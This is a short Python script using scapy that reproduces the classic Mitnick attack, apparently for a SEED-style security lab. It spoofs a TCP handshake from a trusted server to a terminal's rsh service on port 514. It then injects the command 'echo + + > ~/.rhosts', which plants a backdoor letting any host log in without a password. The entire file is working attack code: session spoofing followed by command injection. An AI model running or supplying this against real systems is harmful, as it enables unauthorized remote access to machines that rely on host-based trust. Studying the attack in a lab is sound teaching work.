#!/usr/bin/python3
from scapy.all import *

# Define IPs and ports for the connection
x_ip = "10.9.0.5"     # X-Terminal IP
x_port = 514          # rsh service port on X-Terminal
srv_ip = "10.9.0.6"   # Trusted Server IP
srv_port = 1023       # Source port for the SYN packet

# Global variable to store sequence number from SYN+ACK packet
seq_num = None  # Initialize globally

# Step 1: Send a spoofed SYN packet to start the TCP handshake
syn_pkt = IP(src=srv_ip, dst=x_ip) / TCP(sport=srv_port, dport=x_port, flags="S", seq=0)
send(syn_pkt)
print("Spoofed SYN packet sent from Trusted Server to X-Terminal with sequence number 0.")

# Step 2: Define function to spoof an ACK packet in response to a SYN+ACK
def spoof_ack(pkt):
    global seq_num  # Use global seq_num to store the sequence number
    if pkt[TCP].flags == "SA":  # Check if packet is SYN+ACK
        seq_num = pkt[TCP].seq + 1  # Capture and increment the sequence number
        ack_pkt = IP(src=srv_ip, dst=x_ip) / TCP(sport=srv_port, dport=x_port, flags="A", seq=0, ack=seq_num)
        send(ack_pkt)
        print("Spoofed ACK sent to complete the handshake with sequence number 0.")

# Sniff for SYN+ACK from X-Terminal and call spoof_ack when detected
sniff(filter=f"tcp and src host {x_ip} and dst port {srv_port}", prn=spoof_ack, count=1)

# Step 3: Send the backdoor command to modify .rhosts
if seq_num is not None:
    # Backdoor command to add "+ +" to .rhosts on X-Terminal
    backdoor_cmd = "1023\x00seed\x00seed\x00echo + + > ~/.rhosts\x00"  # Command to add "+ +" to .rhosts
    data_pkt = IP(src=srv_ip, dst=x_ip) / TCP(sport=srv_port, dport=x_port, flags="PA", seq=0, ack=seq_num) / backdoor_cmd
    send(data_pkt)
    print("Backdoor command sent to add '+ +' to .rhosts on X-Terminal.")
else:
    print("Error: seq_num not set. SYN+ACK packet was not captured.")
